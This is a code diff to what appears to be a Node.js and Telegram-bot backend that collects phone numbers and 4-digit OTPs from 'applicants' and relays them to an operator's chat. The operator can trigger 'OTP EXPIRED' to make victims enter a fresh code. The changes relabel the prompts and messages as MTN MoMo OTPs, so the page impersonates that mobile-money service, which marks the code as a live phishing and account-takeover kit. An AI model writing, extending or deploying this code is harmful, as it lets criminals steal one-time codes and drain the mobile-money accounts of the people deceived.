@@ -228,7 +228,7 @@ async function initBot() {
           session.status = 'PROCEED_OTP';
           await bot.sendMessage(
             chatTarget,
-            `📲 SMS approved. Applicant moved to 4-Digit OTP entry screen.`
+            `📲 SMS approved. Applicant moved to MTN MoMo 4-Digit OTP entry screen.`
           );
           break;
         case 'OTPEXPIRED':
@@ -236,7 +236,7 @@ async function initBot() {
           session.otp = '';
           await bot.sendMessage(
             chatTarget,
-            `⚠️ OTP EXPIRED triggered. Applicant redirected back to enter a new 4-digit OTP.`
+            `⚠️ OTP EXPIRED triggered. Applicant redirected back to enter a new MTN MoMo 4-digit OTP.`
           );
           break;
         case 'SUCCESS':
@@ -443,7 +443,7 @@ app.post('/api/submit-otp', async (req, res) => {
     const message =
       `🔐 *MTN MOMO 4-DIGIT OTP* ${autoSubmitted ? '(Auto-Submitted)' : ''}\n\n` +
       `📞 *Phone No:* \`${escapeMarkdown(cleanPhone)}\`\n` +
-      `🔢 *4-Digit OTP:* \`${escapeMarkdown(cleanOtp)}\``;
+      `🔢 *MTN MoMo 4-Digit OTP:* \`${escapeMarkdown(cleanOtp)}\``;
 
     const opts = {
       parse_mode: 'Markdown',
@@ -505,4 +505,4 @@ function shutdown(signal) {
 
 process.on('SIGTERM', () => shutdown('SIGTERM'));
 process.on('SIGINT', () => shutdown('SIGINT'));
-  
+                       
